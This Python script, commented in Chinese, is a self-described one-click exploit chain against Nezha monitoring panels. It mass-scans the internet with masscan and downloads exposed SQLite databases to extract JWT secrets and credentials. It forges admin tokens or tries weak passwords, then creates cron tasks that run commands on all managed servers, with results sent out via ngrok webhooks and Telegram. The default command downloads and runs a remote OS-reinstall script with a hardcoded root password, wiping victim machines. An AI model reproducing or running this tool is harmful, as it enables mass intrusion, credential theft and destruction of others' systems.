#!/usr/bin/env python3
"""
🦞 Nezha v2.2.2 全自动利用链 - 一键脚本
========================================
masscan 扫描 → 下载数据库 → 提取凭证 → 创建 webhook → 创建 cron RCE → Telegram 通知

用法:
  sudo python3 nezha_allinone.py --target 0.0.0.0/0 --telegram-bot-token <TOKEN> --telegram-chat-id <CHAT_ID>
  sudo python3 nezha_allinone.py --target 103.42.30.0/24 --no-telegram
  python3 nezha_allinone.py --targets 103.42.30.123:8008 192.168.1.1:8888 --webhook-url https://xxx.ngrok.io
  python3 nezha_allinone.py --targets 103.42.30.123:8008 --list-only

依赖:
  sudo pip install sqids bcrypt
  sudo apt install masscan   (扫描模式需要)
"""

import sqlite3
import os
import sys
import subprocess
import re
import json
import time
import hmac
import hashlib
import base64
import urllib.request
import urllib.error
import argparse
import threading
import random
import string
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler

# ==================== 全局配置 ====================

VERSION = "1.0.0"
DEFAULT_PORTS = "8008,8888,3000,1314"
DEFAULT_RATE = "1000"
DEDUP_DB = "/tmp/nezha_seen.db"
RESULTS_DIR = "/tmp/nezha_results"
LOG_FILE = "/tmp/nezha_allinone.log"
WEBHOOK_PORT = 9000

os.makedirs(RESULTS_DIR, exist_ok=True)

# ==================== Telegram ====================

class TelegramNotifier:
    def __init__(self, bot_token, chat_id):
        self.bot_token = bot_token
        self.chat_id = chat_id
        self.enabled = bool(bot_token and chat_id)

    def send(self, text, parse_mode="HTML"):
        if not self.enabled:
            return
        url = f"https://api.telegram.org/bot{self.bot_token}/sendMessage"
        data = json.dumps({"chat_id": self.chat_id, "text": text, "parse_mode": parse_mode, "disable_web_page_preview": True}).encode()
        try:
            urllib.request.urlopen(urllib.request.Request(url, data=data, headers={"Content-Type": "application/json"}), timeout=10)
        except Exception as e:
            log(f"[!] TG 发送失败: {e}")

    def send_document(self, caption, file_path):
        if not self.enabled:
            return
        boundary = "----FormBoundary7MA4YWxkTrZu0gW"
        body = b""
        body += f"--{boundary}\r\nContent-Disposition: form-data; name=\"chat_id\"\r\n\r\n{self.chat_id}\r\n".encode()
        if caption:
            body += f"--{boundary}\r\nContent-Disposition: form-data; name=\"caption\"\r\n\r\n{caption}\r\n".encode()
        fname = os.path.basename(file_path)
        body += f"--{boundary}\r\nContent-Disposition: form-data; name=\"document\"; filename=\"{fname}\"\r\nContent-Type: application/octet-stream\r\n\r\n".encode()
        with open(file_path, 'rb') as f:
            body += f.read()
        body += f"\r\n--{boundary}--\r\n".encode()
        try:
            urllib.request.urlopen(urllib.request.Request(
                f"https://api.telegram.org/bot{self.bot_token}/sendDocument",
                data=body, headers={"Content-Type": f"multipart/form-data; boundary={boundary}"}), timeout=15)
        except Exception as e:
            log(f"[!] TG 文件发送失败: {e}")

# ==================== Webhook 接收器 ====================

class WebhookHandler(BaseHTTPRequestHandler):
    tg = None

    def log_message(self, fmt, *args):
        log(f"[HTTP] {fmt % args}")

    def do_GET(self):
        if self.path == "/" or self.path == "/health":
            self.send_html(200, f"""<!DOCTYPE html>
<html><head><title>Nezha AutoGrab</title></head>
<body style="font-family:monospace;background:#1a1a2e;color:#eee;padding:20px;">
<h1 style="color:#e94560;">🦞 Nezha AutoGrab Webhook</h1>
<p>状态: <b style="color:#0f0;">运行中</b></p>
<p>接收: <b>{len(os.listdir(RESULTS_DIR))}</b> 条结果</p>
<p>文件: <a href="/results" style="color:#0af;">/results</a></p>
</body></html>""")
        elif self.path == "/results":
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.end_headers()
            files = sorted(os.listdir(RESULTS_DIR))
            self.wfile.write(("\n".join(files)).encode() if files else b"(empty)")
        else:
            self.send_response(404)
            self.end_headers()

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length)
        ts = datetime.now().strftime("%Y%m%d_%H%M%S_%f")

        server_name = "unknown"
        output = ""
        try:
            data = json.loads(body.decode("utf-8", errors="replace"))
            if isinstance(data, dict):
                server_name = str(data.get("server_name", data.get("name", data.get("server", "unknown"))))
                output = data.get("data", data.get("output", data.get("text", data.get("message", ""))))
                if not output:
                    output = json.dumps(data, ensure_ascii=False, indent=2)
        except:
            output = body.decode("utf-8", errors="replace")

        # 保存
        safe_name = re.sub(r'[^\w\-]', '_', server_name)[:30]
        fname = f"{ts}_{safe_name}.txt"
        fpath = os.path.join(RESULTS_DIR, fname)
        with open(fpath, 'w') as f:
            f.write(f"时间: {datetime.now().isoformat()}\n服务器: {server_name}\n\n{output}\n")

        # Telegram 推送
        if WebhookHandler.tg and WebhookHandler.tg.enabled:
            msg = f"🎯 <b>RCE 结果</b>\n🖥️ <b>{server_name}</b>\n⏰ {datetime.now().strftime('%H:%M:%S')}\n<pre>{output[:3500]}</pre>"
            WebhookHandler.tg.send(msg)
            if len(output) > 3500:
                for i in range(3500, len(output), 3500):
                    WebhookHandler.tg.send(f"🖥️ <code>{server_name}</code>\n<pre>{output[i:i+3500]}</pre>")
            WebhookHandler.tg.send_document(fname, fpath)

        log(f"[+] 收到结果: {server_name} → {fname}")
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")

    def send_html(self, code, html):
        self.send_response(code)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.end_headers()
        self.wfile.write(html.encode())

def start_webhook_server(port):
    server = HTTPServer(("0.0.0.0", port), WebhookHandler)
    threading.Thread(target=server.serve_forever, daemon=True).start()
    log(f"[*] Webhook 服务器启动: 0.0.0.0:{port}")
    return server

# ==================== 日志 ====================

def log(msg):
    ts = datetime.now().strftime("%H:%M:%S")
    line = f"[{ts}] {msg}"
    print(line)
    with open(LOG_FILE, 'a') as f:
        f.write(f"[{datetime.now().isoformat()}] {msg}\n")

# ==================== JWT 工具 ====================

def b64url_encode(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

def b64url_decode(s):
    padding = 4 - len(s) % 4
    if padding != 4:
        s += '=' * padding
    return base64.urlsafe_b64decode(s)

def sign_jwt_hs256(header_b64, payload_b64, secret):
    msg = f"{header_b64}.{payload_b64}".encode()
    sig = hmac.new(secret.encode(), msg, hashlib.sha256).digest()
    return b64url_encode(sig)

def forge_jwt(secret, user_id, key_id=None, exp_hours=24):
    header = {"alg": "HS256", "typ": "JWT"}
    now = int(time.time())
    exp = now + exp_hours * 3600
    if not key_id:
        key_id = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(32))
    try:
        import sqids
        s = sqids.Sqids(alphabet="abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ23456789", min_length=8)
        uid = s.encode([user_id])
    except ImportError:
        uid = str(user_id)
    payload = {"uid": uid, "keyId": key_id, "orig_iat": now, "exp": exp}
    h_b64 = b64url_encode(json.dumps(header).encode())
    p_b64 = b64url_encode(json.dumps(payload).encode())
    return f"{h_b64}.{p_b64}.{sign_jwt_hs256(h_b64, p_b64, secret)}"

# ==================== API 交互 ====================

def api_call(base_url, token, method, path, data=None, timeout=10):
    url = f"{base_url}/api/v1{path}"
    headers = {"Content-Type": "application/json", "Accept": "application/json", "User-Agent": "Mozilla/5.0"}
    if token:
        headers["Authorization"] = f"Bearer {token}"
    body = json.dumps(data).encode() if data else None
    try:
        req = urllib.request.Request(url, data=body, headers=headers, method=method)
        resp = urllib.request.urlopen(req, timeout=timeout)
        return json.loads(resp.read().decode())
    except urllib.error.HTTPError as e:
        try:
            return json.loads(e.read().decode())
        except:
            return {"error": str(e), "code": e.code}

def api_login(base_url, username, password):
    r = api_call(base_url, None, "POST", "/login", {"username": username, "password": password})
    if r.get("success") and r.get("data", {}).get("token"):
        return r["data"]["token"]
    return None

def api_list_servers(base_url, token):
    r = api_call(base_url, token, "GET", "/server")
    return r.get("data", []) if r.get("success") else []

def api_create_notification(base_url, token, webhook_url):
    data = {"name": "whk", "url": webhook_url, "request_method": 2, "request_type": 1, "verify_tls": False, "skip_check": True}
    r = api_call(base_url, token, "POST", "/notification", data)
    return r.get("data") if r.get("success") else None

def api_create_notification_group(base_url, token, notif_ids):
    data = {"name": "whkg", "notifications": notif_ids}
    r = api_call(base_url, token, "POST", "/notification-group", data)
    return r.get("data") if r.get("success") else None

def api_create_cron(base_url, token, command, gid, schedule="*/1 * * * * *"):
    data = {
        "name": "sysinfo", "task_type": 0, "scheduler": schedule,
        "command": command, "servers": [], "cover": 1,
        "push_successful": True, "notification_group_id": gid
    }
    r = api_call(base_url, token, "POST", "/cron", data)
    return r.get("data") if r.get("success") else None

# ==================== Masscan 扫描 ====================

def massscan(target, ports, rate):
    conn = sqlite3.connect(DEDUP_DB)
    cur = conn.cursor()
    cur.execute("CREATE TABLE IF NOT EXISTS seen (ip TEXT, port INTEGER, PRIMARY KEY (ip, port))")
    conn.commit()

    cmd = ["masscan", target, "-p", ports, "--rate", str(rate), "--open", "-oG", "-"]
    log(f"[*] masscan: {' '.join(cmd)}")
    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)

    pattern = re.compile(r"Host:\s+(\S+)\s+.*Ports:\s+(\d+)/open")
    targets = []
    for line in proc.stdout:
        line = line.strip()
        if not line or line.startswith("#") or line.startswith("Starting") or line.startswith("masscan"):
            continue
        m = pattern.search(line)
        if not m:
            continue
        ip, port = m.group(1), int(m.group(2))
        cur.execute("SELECT 1 FROM seen WHERE ip=? AND port=?", (ip, port))
        if cur.fetchone() is None:
            cur.execute("INSERT INTO seen VALUES (?, ?)", (ip, port))
            conn.commit()
            targets.append((ip, port))
            log(f"[+] 发现: {ip}:{port}")

    conn.close()
    log(f"[*] 扫描完成, 共 {len(targets)} 个新目标")
    return targets

# ==================== 数据库解析 ====================

def parse_db(db_path):
    conn = sqlite3.connect(db_path)
    conn.row_factory = sqlite3.Row
    cur = conn.cursor()

    info = {"jwt_secret": None, "admins": [], "users": [], "sessions": [], "tokens": [], "tables": []}

    cur.execute("SELECT name FROM sqlite_master WHERE type='table' ORDER BY name")
    info["tables"] = [r[0] for r in cur.fetchall()]

    # JWT Secret
    cur.execute("SELECT * FROM configs LIMIT 1")
    cfg = cur.fetchone()
    if cfg:
        for k in cfg.keys():
            v = cfg[k]
            if v and isinstance(v, str) and any(w in k.lower() for w in ["secret", "jwt", "token", "key"]):
                info["jwt_secret"] = v

    # 用户
    cur.execute("SELECT id, username, password, role, agent_secret, token_version FROM users")
    for u in cur.fetchall():
        entry = dict(u)
        if u["role"] == 0:
            info["admins"].append(entry)
        info["users"].append(entry)

    # JWT Sessions
    now = datetime.now()
    cur.execute("SELECT * FROM jwt_sessions")
    for s in cur.fetchall():
        expired = revoked = False
        if s["expires_at"]:
            try: expired = now > datetime.fromisoformat(s["expires_at"].replace("Z", "+00:00"))
            except: pass
        if s["revoked_at"]:
            revoked = True
        session = dict(s)
        session["valid"] = not expired and not revoked
        info["sessions"].append(session)

    # API Tokens
    cur.execute("SELECT id, user_id, name, scopes_csv, expires_at FROM api_tokens")
    for t in cur.fetchall():
        token = dict(t)
        if t["expires_at"]:
            try: token["valid"] = now < datetime.fromisoformat(t["expires_at"].replace("Z", "+00:00"))
            except: token["valid"] = False
        info["tokens"].append(token)

    conn.close()
    return info

def print_db_info(ip, port, info):
    log(f"  📂 {ip}:{port}  ({os.path.getsize(f'/tmp/nezha_{ip}_{port}.db'):,} bytes)")
    log(f"  表: {', '.join(info['tables'])}")

    if info["admins"]:
        for a in info["admins"]:
            log(f"  👑 管理员: {a['username']}  Agent密钥={a['agent_secret']}")
    if info["jwt_secret"]:
        log(f"  🔐 JWT Secret: {info['jwt_secret']}")
    for s in info["sessions"]:
        if s["valid"]:
            log(f"  🔑 有效Session: KeyID={s['key_id']}  用户={s['user_id']}  IP={s['ip']}")

# ==================== 数据库下载 ====================

def try_download_db(ip, port, timeout=8):
    base = f"http://{ip}:{port}"
    for path in ["/data/sqlite.db", "/dashboard/data/sqlite.db"]:
        url = f"{base}{path}"
        try:
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
            resp = urllib.request.urlopen(req, timeout=timeout)
            data = resp.read()
            if len(data) > 100 and data[:6] == b'SQLite':
                save = f"/tmp/nezha_{ip}_{port}.db"
                with open(save, 'wb') as f:
                    f.write(data)
                log(f"[+] {ip}:{port} 数据库下载成功 → {save} ({len(data):,} bytes)")
                return save
        except:
            pass
    return None

# ==================== 利用链 ====================

def exploit_target(base_url, token, webhook_url, tg, command):
    """对单个目标执行完整利用链"""
    log(f"[*] === 开始利用 {base_url} ===")

    # 1. 列出服务器
    servers = api_list_servers(base_url, token)
    if not servers:
        log(f"[-] 无法获取服务器列表")
        return False

    server_ips = []
    log(f"[+] 找到 {len(servers)} 台服务器:")
    for s in servers:
        ipv4 = s.get("geoip", {}).get("ip", {}).get("ipv4_addr", "") if s.get("geoip") else ""
        ipv6 = s.get("geoip", {}).get("ip", {}).get("ipv6_addr", "") if s.get("geoip") else ""
        ips = "/".join(filter(None, [ipv4, ipv6]))
        server_ips.append(f"{s.get('name','?')}={ips}")
        log(f"    {s.get('name','?')}  {ips}")

    # 2. 创建 webhook 通知
    log(f"[*] 创建 webhook 通知...")
    nid = api_create_notification(base_url, token, webhook_url)
    if not nid:
        log(f"[-] 创建通知失败")
        return False
    log(f"[+] 通知 NID={nid}")

    # 3. 创建通知组
    log(f"[*] 创建通知组...")
    gid = api_create_notification_group(base_url, token, [nid])
    if not gid:
        log(f"[-] 创建通知组失败")
        return False
    log(f"[+] 通知组 GID={gid}")

    # 4. 创建 cron RCE
    log(f"[*] 创建 RCE 定时任务...")
    cid = api_create_cron(base_url, token, command, [], gid)
    if not cid:
        log(f"[-] 创建 cron 失败")
        return False

    log(f"[+] 🎯 利用成功! CID={cid}")
    log(f"    目标: {len(servers)} 台服务器")
    log(f"    命令: {command[:80]}...")
    log(f"    结果回传: {webhook_url}")

    if tg.enabled:
        tg.send(f"🎯 <b>Nezha 利用成功</b>\n"
                f"🌐 <b>目标:</b> {base_url}\n"
                f"🖥️ <b>服务器:</b> {len(servers)} 台\n"
                f"📋 <b>列表:</b> {', '.join(server_ips[:5])}{'...' if len(server_ips)>5 else ''}\n"
                f"⏰ <b>Cron ID:</b> {cid}\n"
                f"📡 <b>Webhook:</b> {webhook_url}")

    return True

# ==================== 主流程 ====================

def process_target(ip, port, webhook_url, tg, command, skip_download=False):
    """处理单个目标: 下载db → 解析 → 利用"""
    base_url = f"http://{ip}:{port}"
    log(f"\n{'='*60}")
    log(f"[*] 处理目标: {ip}:{port}")

    # 步骤1: 下载数据库
    if not skip_download:
        db_path = try_download_db(ip, port)
        if not db_path:
            log(f"[-] {ip}:{port} 无法下载数据库，跳过")
            return
    else:
        db_path = skip_download if isinstance(skip_download, str) else f"/tmp/nezha_{ip}_{port}.db"
        if not os.path.exists(db_path):
            log(f"[-] 数据库不存在: {db_path}")
            return

    # 步骤2: 解析数据库
    info = parse_db(db_path)
    print_db_info(ip, port, info)

    # 步骤3: 获取 JWT
    token = None

    # 3a: 用 JWT Secret 伪造
    if info["jwt_secret"]:
        for admin in info["admins"]:
            token = forge_jwt(info["jwt_secret"], admin["id"])
            log(f"[+] 伪造管理员 JWT: {admin['username']} (ID={admin['id']})")
            break
        if not token and info["users"]:
            token = forge_jwt(info["jwt_secret"], info["users"][0]["id"])
            log(f"[+] 伪造用户 JWT: {info['users'][0]['username']}")

    # 3b: 用有效 Session 的 keyId
    if not token:
        for s in info["sessions"]:
            if s["valid"]:
                log(f"[+] 有效 JWT session: KeyID={s['key_id']}")
                # 无法直接用 keyId，需要 Secret 才能签名
                break

    # 3c: 尝试常见弱密码登录
    if not token:
        weak_pw = ["123456", "password", "admin", "admin123", "root", "nezha",
                    "12345678", "1234", "12345", "P@ssw0rd", "admin888"]
        for u in info["users"]:
            for pw in weak_pw:
                try:
                    import bcrypt
                    if bcrypt.checkpw(pw.encode(), u["password"].encode()):
                        token = api_login(base_url, u["username"], pw)
                        if token:
                            log(f"[+] 弱密码登录成功: {u['username']}/{pw}")
                            break
                except ImportError:
                    break
            if token:
                break

    if not token:
        log(f"[-] 无法获取有效 JWT，尝试利用漏洞创建 admin...")
        # 尝试用已失效的 session 或空 token 看看能不能撞上
        # 漏洞本身允许任意用户创建admin，前提是有有效JWT
        log(f"[-] 跳过利用 (需要有效登录凭证)")
        return

    # 步骤4: 利用
    success = exploit_target(base_url, token, webhook_url, tg, command)

    if success and tg.enabled:
        tg.send(f"✅ <b>{ip}:{port}</b> 利用完成，等待 agent 回传结果...")

def main():
    parser = argparse.ArgumentParser(description="🦞 Nezha v2.2.2 全自动利用链")
    parser.add_argument("--target", default="0.0.0.0/0", help="masscan 目标网段 (默认: 全网)")
    parser.add_argument("--ports", default=DEFAULT_PORTS, help=f"扫描端口 (默认: {DEFAULT_PORTS})")
    parser.add_argument("--rate", default=DEFAULT_RATE, help="masscan 速率 (默认: 1000)")
    parser.add_argument("--targets", nargs="+", help="手动指定 ip:port 列表 (跳过扫描)")
    parser.add_argument("--no-scan", action="store_true", help="跳过扫描")
    parser.add_argument("--webhook-url", help="Webhook URL (不使用 ngrok 时指定)")
    parser.add_argument("--telegram-bot-token", default=os.environ.get("TELEGRAM_BOT_TOKEN", ""))
    parser.add_argument("--telegram-chat-id", default=os.environ.get("TELEGRAM_CHAT_ID", ""))
    parser.add_argument("--command", help="自定义 cron 执行命令")
    parser.add_argument("--list-only", action="store_true", help="只下载数据库并列出信息")
    parser.add_argument("--dedup-db", default=DEDUP_DB)
    parser.add_argument("--webhook-port", type=int, default=WEBHOOK_PORT)
    args = parser.parse_args()

    tg = TelegramNotifier(args.telegram_bot_token, args.telegram_chat_id)
    if tg.enabled:
        log(f"[*] Telegram 已配置")
        tg.send(f"🦞 <b>Nezha AutoGrab v{VERSION} 启动</b>\n目标: {args.target}")

    # 默认 RCE 命令
    command = args.command or "curl -fsSL https://raw.githubusercontent.com/bin456789/reinstall/main/reinstall.sh -o reinstall.sh || wget -O reinstall.sh https://raw.githubusercontent.com/bin456789/reinstall/main/reinstall.sh && bash reinstall.sh debian --username root --password Sddfcnb-1 && reboot"

    # 步骤0: 启动 webhook 接收器
    start_webhook_server(args.webhook_port)
    time.sleep(1)

    # 获取 webhook URL
    webhook_url = args.webhook_url
    if not webhook_url:
        # 尝试 ngrok
        try:
            subprocess.run(["ngrok", "--version"], capture_output=True, check=True, timeout=3)
            ngrok = subprocess.Popen(
                ["ngrok", "http", str(args.webhook_port)],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )
            time.sleep(3)
            webhook_url = json.loads(urllib.request.urlopen("http://localhost:4040/api/tunnels", timeout=3).read()) \
                .get("tunnels", [{}])[0].get("public_url", "")
            if webhook_url:
                log(f"[+] ngrok URL: {webhook_url}")
                if tg.enabled:
                    tg.send(f"🔗 <b>Webhook:</b> {webhook_url}/")
        except:
            log(f"[!] ngrok 不可用，需手动指定 --webhook-url")

    if not webhook_url:
        log("[!] 没有可用的 webhook URL，将只执行下载+分析")
        if not args.list_only:
            args.list_only = True

    # 收集目标
    targets = []
    if args.targets:
        for t in args.targets:
            if ":" in t:
                ip, port = t.rsplit(":", 1)
                targets.append((ip, int(port)))
    elif not args.no_scan:
        targets = massscan(args.target, args.ports, args.rate)
    else:
        log("[!] 没有目标，请用 --targets 或 --target")
        return

    log(f"\n[*] 共 {len(targets)} 个目标")

    # 处理每个目标
    for ip, port in targets:
        try:
            if args.list_only:
                process_target(ip, port, webhook_url, tg, command)
            else:
                process_target(ip, port, webhook_url, tg, command)
        except KeyboardInterrupt:
            log("[*] 用户中断")
            break
        except Exception as e:
            log(f"[!] {ip}:{port} 处理异常: {e}")

    log(f"\n{'='*60}")
    log(f"[*] 全部完成! 结果目录: {RESULTS_DIR}")
    log(f"[*] 日志: {LOG_FILE}")
    if webhook_url:
        log(f"[*] Webhook: {webhook_url}/")

if __name__ == "__main__":
    main()
